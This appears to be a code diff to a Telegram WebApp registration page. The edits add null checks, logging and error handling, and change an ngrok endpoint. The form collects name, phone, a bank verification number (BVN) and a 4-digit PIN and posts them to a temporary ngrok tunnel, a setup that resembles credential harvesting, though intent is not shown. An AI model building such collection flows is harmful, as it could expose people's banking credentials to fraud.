@@ -101,8 +101,8 @@
 </div>
 
 <script>
-  let tg = window.Telegram.WebApp;
-  tg.expand();
+  const tg = window.Telegram?.WebApp || null;
+  if (tg) tg.expand();
 
   function nextStep() {
     const firstName = document.getElementById("firstName").value;
@@ -130,35 +130,42 @@
   }
 
   async function submitForm() {
+    console.log("Submitting form...");
+
     const firstName = document.getElementById("firstName").value;
     const surname = document.getElementById("surname").value;
     const phone = document.getElementById("phone").value;
     const bvn = document.getElementById("bvn").value;
     const pin = document.getElementById("pin").value;
     const confirmPin = document.getElementById("confirmPin").value;
-    const username = tg.initDataUnsafe?.user?.username || "unknown";
+    const username = tg?.initDataUnsafe?.user?.username || "unknown";
 
     if (!pin || pin.length !== 4 || pin !== confirmPin) {
       document.getElementById("step2Error").innerText = "PINs must match and be 4 digits.";
       return;
     }
 
-    const res = await fetch("https://e73c0dce3be9.ngrok-free.app/register", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        first_name: firstName,
-        surname: surname,
-        phone: phone,
-        bvn: bvn,
-        telegram_username: username,
-        pin: pin
-      })
-    });
+    try {
+      const res = await fetch("https://575595160557.ngrok-free.app/register", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          first_name: firstName,
+          surname: surname,
+          phone: phone,
+          bvn: bvn,
+          telegram_username: username,
+          pin: pin
+        })
+      });
 
-    const result = await res.json();
-    document.getElementById("step2").classList.add("hidden");
-    document.getElementById("message").innerText = result.message || "Registered successfully!";
+      const result = await res.json();
+      document.getElementById("step2").classList.add("hidden");
+      document.getElementById("message").innerText = result.message || "Registered successfully!";
+    } catch (error) {
+      console.error("Submission failed:", error);
+      document.getElementById("message").innerText = "Something went wrong. Please try again.";
+    }
   }
 </script>
 </body>
